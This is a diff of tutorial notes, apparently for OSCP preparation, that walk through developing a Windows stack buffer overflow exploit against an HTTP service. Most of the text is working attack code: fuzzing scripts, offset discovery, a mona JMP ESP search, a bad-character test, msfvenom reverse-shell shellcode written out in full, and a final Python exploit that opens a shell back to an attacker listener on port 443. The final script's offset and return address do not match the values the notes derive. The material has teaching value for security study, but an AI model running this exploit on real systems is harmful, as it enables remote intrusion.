@@ -6,33 +6,54 @@ Protection techniques
     Both the operating system and the binary needs to support it.
 
 Identification
-    First step is to identify the vulnerability. You can debug the app and fuzz it with large buffers and identify a crash, crop the needed amount of data to a limited size.
+    First step is to identify the vulnerability. You can debug the app and fuzz it with larger strings and identify the approximate length that causes the crash. We can script it as follows:
     *import socket
 
-# Create an array of buffers, from 10 to 2000, with increments of 20. buffer=["A"]
+# Create an array of buffers, from 10 to 2000, with increments of 20.
 counter = 100
+fuzz_strings = ["A"]
 
-buffer = ["A"]
-
-while len(buffer) <= 30:
-    buffer.append("A" * counter)
+while len(fuzz_strings) <= 30:
+    fuzz_strings.append("A" * counter)
     counter = counter + 200
 
-for string in buffer:
-    print "Fuzzing with %s bytes" % len(string)
+for fuzz in fuzz_strings:
+    print "Fuzzing with %s bytes" % len(fuzz)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connect = s.connect(('192.168.0.9', 80))
-    #s.recv(1024)
-    s.send('GET ' + string)
+    s.send('GET ' + fuzz + '\r\n\r\n' )
+    print s.recv(1024)
     s.close()*
-    Second step is determine the exact amount of padding before the *EIP* instruction. You can generate a large string with unique characters with:
+
+    We run the script and find that the app crashes when sending a string 2700 long, so we know that the buffer is somewhere between 2500 and 2700.
+
+Finding EIP
+    Second step is to find the exact size of the buffer before the EIP register. We can achieve this by generating a string with unique sequence of characters and use the debugger to find the value that overwrites the EIP register. We create the string as follows:
     *$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700*
+
+    We add the string to our script:
+    *import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+buffer='STRING'
+try:
+    print "\nSending evil buffer..."
+    s.connect(('192.168.0.9', 80))
+    s.send('GET ' + buffer + '\r\n\r\n')
+    print s.recv(1024)
+    print "\nDone!."
+except:
+    print "Could not connect"*
 
     Send the payload and find the value of EIP, and find the exact length needed with:
     *$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l STRING_LENGTH(2700) -q EIP_VALUE(37694236)
+
 [*] Exact match at offset 2606*
 
-    Our objective is to inject a shellcode in beginning of the stack, replace the0 *EIP* with the address of the *ESP* and get the execution flow redirected to our shellcode. The problem is that the amount of data loaded changes every time and we can not predict the value of the ESP address. We can work around this by finding a JMP ESP instruction in memory from a module that has no *DES* or *ASLR*
+    We know that the buffer size before the EIP is 2606.
+
+Finding a JMP ESP
+    Our objective is to inject a shellcode in beginning of the stack, replace the *EIP* with the address of the *ESP* and get the execution flow redirected to our shellcode. The problem is that the amount of data loaded in the stack changes at every execution, so we can not predict the value of the ESP address. We can work around this by finding a JMP ESP instruction in memory from a module that has no *DES* or *ASLR*, and change our EIP to point to that address.
 
     To find the modules that don't have ASLR and DES, you can run within the ImmunityDebugger:
     *!mona modules*
@@ -43,19 +64,70 @@ nasm > jmp esp
 nasm >*
     Now you can find *FFE4* with:
     *!mona find -s '\xff\xe4' -m module.dll*
-    It will find some addrs such as *0x5f4a358f*, since x86 is little endian you need to encode it as * \x8f\x35\x4a\x5f*.
+    It will find some addrs such as *0x5f4a358f*, since x86 is little endian, to have it properly read from the stack we need to encode it as * \x8f\x35\x4a\x5f*.
 
-    You should be able to send a buffer that looks like
-    *'A'*2606 + \x8f\x35\x4a\x5f + 'C'*400*
+    We will add our shellcode after the EIP JMP instruction (of about 400 bytes), so our payload will look like this
+    *Padding + JMP ESP + shellcode*
+    Using the previous buffer size and address:
+    *'A' * 2606 + \x8f\x35\x4a\x5f + 'C' * 400*
 
-    Setting a breakpoint (F2 ImmunityDebugger) in at memory location *5f4a358f*, the debugger should pause when sending the payload, and stepping into the next instruction (F7) should jump to a the top of the stack, where there should be 400 C. If there are less 'C', then the input has been truncated and you will probably need a bigger buffer to fit your shellcode.
+    So, the new exploit looks like this:
+    *import socket
 
-    Next step is to generate a shellcode. Before doing that, we need to know what characters the application allows. Run *badchars.py* and find potential bad characters that the application truncates. (I.E 0x00, in Pop3 new line char(0xA) as it is the command separator, etc..).
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+buffer = 'A' * 2606 + \x8f\x35\x4a\x5f + 'C' * 400
+try:
+    print "\nSending evil buffer..."
+    s.connect(('192.168.0.9', 80))
+    s.send('GET ' + buffer + '\r\n\r\n')
+    print s.recv(1024)
+    print "\nDone!."
+except:
+    print "Could not connect"*
+
+    We will set a breakpoint to that memory location (*5f4a358f*) and run the new exploit. We go to CPU view, right click, go to, expression and the address. Press F2 in ImmunityDebugger to set the breakpoint, the debugger should pause when sending the payload, and stepping into the next instruction (F7) should jump to a the top of the stack, where there should be 400 C. If there are less 'C', then the input has been truncated and you will probably need a bigger buffer to fit your shellcode.
+
+Finding bad characters
+    Next step is to generate a shellcode. Before doing that, we need to know what characters the application allows. We will send a buffer that contains all the ASCII characters:
+
+    *import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+badchars = (
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+)
+buffer = "A" * 2606 + "B" * 4 + badchars
+try:
+    print "\nSending evil buffer..."
+    s.connect(('10.11.10.27', 110))
+    s.send('GET ' + buffer + '\r\n\r\n')
+    print s.recv(1024)
+    s.close()
+    print "\nDone!"
+except:
+    print "Could not connect"*
+
+    We run it, right click in the ESP address, and follow  in dump to find potential bad characters that the application truncates. (I.E 0x00, in Pop3 new line char(0xA) as it is the command separator, etc..).
 
     So we know how much padding we need to add to the stack to overwrite the EIP, we know an address that will get the execution flow redirected to the start of the stack, we just need to create a shellcode.
 
-Develop exploit
-    List all available payloads in metasploit:
+Injecting a shellcode
+    First step, is to generate the shellcode. You can list all available payloads in metasploit:
     *$ msfpayload –l*
     Generate a reverse shell shellcode.
     *$ msfpayload windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=443  -f c*
@@ -63,6 +135,85 @@ Develop exploit
     *$ msfpayload windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=443 R | msfencode -b "\x00\x0a\x0d"*
     Generic windows reverse shell:
     *$ msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f  c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
-    You shoul add some extra padding with *NOP* in hex *0x90* between the EIP address and the shellcode, so the data sent looks like:
+
+    In the end, you are going to have a shellcode as the following one:
+    *root@kali:~/oscp/bo_miniserver# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.4 LPORT=443 -f  c –e x86/shikata_ga_nai -b "\x00\x0d"
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+Found 10 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of c file: 1500 bytes
+unsigned char buf[] =
+"\xbf\x09\x50\xa4\x04\xdb\xd3\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
+"\x52\x31\x7e\x12\x83\xc6\x04\x03\x77\x5e\x46\xf1\x7b\xb6\x04"
+"\xfa\x83\x47\x69\x72\x66\x76\xa9\xe0\xe3\x29\x19\x62\xa1\xc5"
+"\xd2\x26\x51\x5d\x96\xee\x56\xd6\x1d\xc9\x59\xe7\x0e\x29\xf8"
+"\x6b\x4d\x7e\xda\x52\x9e\x73\x1b\x92\xc3\x7e\x49\x4b\x8f\x2d"
+"\x7d\xf8\xc5\xed\xf6\xb2\xc8\x75\xeb\x03\xea\x54\xba\x18\xb5"
+"\x76\x3d\xcc\xcd\x3e\x25\x11\xeb\x89\xde\xe1\x87\x0b\x36\x38"
+"\x67\xa7\x77\xf4\x9a\xb9\xb0\x33\x45\xcc\xc8\x47\xf8\xd7\x0f"
+"\x35\x26\x5d\x8b\x9d\xad\xc5\x77\x1f\x61\x93\xfc\x13\xce\xd7"
+"\x5a\x30\xd1\x34\xd1\x4c\x5a\xbb\x35\xc5\x18\x98\x91\x8d\xfb"
+"\x81\x80\x6b\xad\xbe\xd2\xd3\x12\x1b\x99\xfe\x47\x16\xc0\x96"
+"\xa4\x1b\xfa\x66\xa3\x2c\x89\x54\x6c\x87\x05\xd5\xe5\x01\xd2"
+"\x1a\xdc\xf6\x4c\xe5\xdf\x06\x45\x22\x8b\x56\xfd\x83\xb4\x3c"
+"\xfd\x2c\x61\x92\xad\x82\xda\x53\x1d\x63\x8b\x3b\x77\x6c\xf4"
+"\x5c\x78\xa6\x9d\xf7\x83\x21\x62\xaf\x8b\xb5\x0a\xb2\x8b\xb4"
+"\x71\x3b\x6d\xdc\x95\x6a\x26\x49\x0f\x37\xbc\xe8\xd0\xed\xb9"
+"\x2b\x5a\x02\x3e\xe5\xab\x6f\x2c\x92\x5b\x3a\x0e\x35\x63\x90"
+"\x26\xd9\xf6\x7f\xb6\x94\xea\xd7\xe1\xf1\xdd\x21\x67\xec\x44"
+"\x98\x95\xed\x11\xe3\x1d\x2a\xe2\xea\x9c\xbf\x5e\xc9\x8e\x79"
+"\x5e\x55\xfa\xd5\x09\x03\x54\x90\xe3\xe5\x0e\x4a\x5f\xac\xc6"
+"\x0b\x93\x6f\x90\x13\xfe\x19\x7c\xa5\x57\x5c\x83\x0a\x30\x68"
+"\xfc\x76\xa0\x97\xd7\x32\xd0\xdd\x75\x12\x79\xb8\xec\x26\xe4"
+"\x3b\xdb\x65\x11\xb8\xe9\x15\xe6\xa0\x98\x10\xa2\x66\x71\x69"
+"\xbb\x02\x75\xde\xbc\x06";*
+
+    The shellcode needs to be decoded in memory, which means we need extra space in the stack. We can achieve this by adding some NOPs before the shellcode, so our buffer looks like this:
     *"A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode*
 
+    We add the shellcode to the previous Poc:
+
+    *import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+shellcode = (
+"\xbf\x09\x50\xa4\x04\xdb\xd3\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
+"\x52\x31\x7e\x12\x83\xc6\x04\x03\x77\x5e\x46\xf1\x7b\xb6\x04"
+"\xfa\x83\x47\x69\x72\x66\x76\xa9\xe0\xe3\x29\x19\x62\xa1\xc5"
+"\xd2\x26\x51\x5d\x96\xee\x56\xd6\x1d\xc9\x59\xe7\x0e\x29\xf8"
+"\x6b\x4d\x7e\xda\x52\x9e\x73\x1b\x92\xc3\x7e\x49\x4b\x8f\x2d"
+"\x7d\xf8\xc5\xed\xf6\xb2\xc8\x75\xeb\x03\xea\x54\xba\x18\xb5"
+"\x76\x3d\xcc\xcd\x3e\x25\x11\xeb\x89\xde\xe1\x87\x0b\x36\x38"
+"\x67\xa7\x77\xf4\x9a\xb9\xb0\x33\x45\xcc\xc8\x47\xf8\xd7\x0f"
+"\x35\x26\x5d\x8b\x9d\xad\xc5\x77\x1f\x61\x93\xfc\x13\xce\xd7"
+"\x5a\x30\xd1\x34\xd1\x4c\x5a\xbb\x35\xc5\x18\x98\x91\x8d\xfb"
+"\x81\x80\x6b\xad\xbe\xd2\xd3\x12\x1b\x99\xfe\x47\x16\xc0\x96"
+"\xa4\x1b\xfa\x66\xa3\x2c\x89\x54\x6c\x87\x05\xd5\xe5\x01\xd2"
+"\x1a\xdc\xf6\x4c\xe5\xdf\x06\x45\x22\x8b\x56\xfd\x83\xb4\x3c"
+"\xfd\x2c\x61\x92\xad\x82\xda\x53\x1d\x63\x8b\x3b\x77\x6c\xf4"
+"\x5c\x78\xa6\x9d\xf7\x83\x21\x62\xaf\x8b\xb5\x0a\xb2\x8b\xb4"
+"\x71\x3b\x6d\xdc\x95\x6a\x26\x49\x0f\x37\xbc\xe8\xd0\xed\xb9"
+"\x2b\x5a\x02\x3e\xe5\xab\x6f\x2c\x92\x5b\x3a\x0e\x35\x63\x90"
+"\x26\xd9\xf6\x7f\xb6\x94\xea\xd7\xe1\xf1\xdd\x21\x67\xec\x44"
+"\x98\x95\xed\x11\xe3\x1d\x2a\xe2\xea\x9c\xbf\x5e\xc9\x8e\x79"
+"\x5e\x55\xfa\xd5\x09\x03\x54\x90\xe3\xe5\x0e\x4a\x5f\xac\xc6"
+"\x0b\x93\x6f\x90\x13\xfe\x19\x7c\xa5\x57\x5c\x83\x0a\x30\x68"
+"\xfc\x76\xa0\x97\xd7\x32\xd0\xdd\x75\x12\x79\xb8\xec\x26\xe4"
+"\x3b\xdb\x65\x11\xb8\xe9\x15\xe6\xa0\x98\x10\xa2\x66\x71\x69"
+"\xbb\x02\x75\xde\xbc\x06"
+)
+buffer = "A" * 1787 + "\x7E\x6E\xEF\x77" + "\x90" * 8 + shellcode
+try:
+    print "\nSending evil buffer..."
+    s.connect(('192.168.0.9', 80))
+    s.send('GET ' + buffer + '\r\n\r\n')
+    print s.recv(1024)
+    print "\nDone!."
+except:
+    print "Could not connect"*
+
+    We run nc -lvp 443, and we should get a reverse shell, we can debug the previous memory address to identify potential problems.
